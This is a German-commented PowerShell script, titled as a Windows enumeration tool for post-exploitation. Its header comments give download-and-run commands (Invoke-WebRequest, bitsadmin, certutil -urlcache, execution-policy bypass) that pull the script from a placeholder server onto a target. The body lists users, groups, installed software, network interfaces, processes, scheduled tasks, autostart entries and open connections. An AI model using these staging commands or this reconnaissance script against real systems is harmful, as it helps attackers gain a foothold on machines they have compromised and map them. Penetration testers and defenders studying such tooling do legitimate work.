# Windows Enum-Skript für die Post-Exploitation


# Invoke-WebRequest -Uri "http://dein-server/enum_script.ps1" -OutFile "C:\enum_script.ps1"
# bitsadmin /transfer "DownloadJob" http://dein-server/enum_script.ps1 C:\enum_script.ps1
# certutil -urlcache -split -f "http://dein-server/enum_script.ps1" C:\enum_script.ps1
# powershell.exe -ExecutionPolicy Bypass -File C:\enum_script.ps1
#
#

# Anmeldung auf lokalem System überprüfen
$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
Write-Host "Angemeldeter Benutzer: $($currentUser.Name)"

# Hostnamen abrufen
$hostname = $env:COMPUTERNAME
Write-Host "Hostname: $hostname"

# Betriebssysteminformationen abrufen
$os = Get-WmiObject -Class Win32_OperatingSystem
Write-Host "Betriebssystem: $($os.Caption)"
Write-Host "Version: $($os.Version)"
Write-Host "Build-Nummer: $($os.BuildNumber)"

# Installierte Anwendungen auflisten
$installedApps = Get-WmiObject -Class Win32_Product
Write-Host "Installierte Anwendungen:"
foreach ($app in $installedApps) {
    Write-Host "- $($app.Name)"
}

# Netzwerkschnittstellen auflisten
$networkInterfaces = Get-WmiObject -Class Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled }
Write-Host "Netzwerkschnittstellen:"
foreach ($interface in $networkInterfaces) {
    Write-Host "- $($interface.Description)"
    Write-Host "  IP-Adresse: $($interface.IPAddress)"
    Write-Host "  Subnetzmaske: $($interface.IPSubnet)"
}

# Lokale Benutzer auflisten
$localUsers = Get-WmiObject -Class Win32_UserAccount | Where-Object { $_.LocalAccount -eq $true }
Write-Host "Lokale Benutzer:"
foreach ($user in $localUsers) {
    Write-Host "- $($user.Name)"
}

# Sicherheitsgruppen auflisten
$securityGroups = Get-WmiObject -Class Win32_Group
Write-Host "Sicherheitsgruppen:"
foreach ($group in $securityGroups) {
    Write-Host "- $($group.Name)"
}

# Geplante Tasks auflisten
$tasks = Get-ScheduledTask
Write-Host "Geplante Tasks:"
foreach ($task in $tasks) {
    Write-Host "- $($task.TaskName)"
}

# Laufende Prozesse auflisten
$processes = Get-Process
Write-Host "Laufende Prozesse:"
foreach ($process in $processes) {
    Write-Host "- $($process.ProcessName) (PID: $($process.Id))"
}

# Autostart-Einträge auflisten
$autostart = Get-CimInstance -Query "SELECT * FROM Win32_StartupCommand"
Write-Host "Autostart-Einträge:"
foreach ($entry in $autostart) {
    Write-Host "- $($entry.Name)"
    Write-Host "  Pfad: $($entry.Command)"
}

# Offene Netzwerkverbindungen auflisten
$networkConnections = Get-NetTCPConnection
Write-Host "Offene Netzwerkverbindungen:"
foreach ($connection in $networkConnections) {
    Write-Host "- Local Address: $($connection.LocalAddress), Local Port: $($connection.LocalPort)"
    Write-Host "  Remote Address: $($connection.RemoteAddress), Remote Port: $($connection.RemotePort)"
}
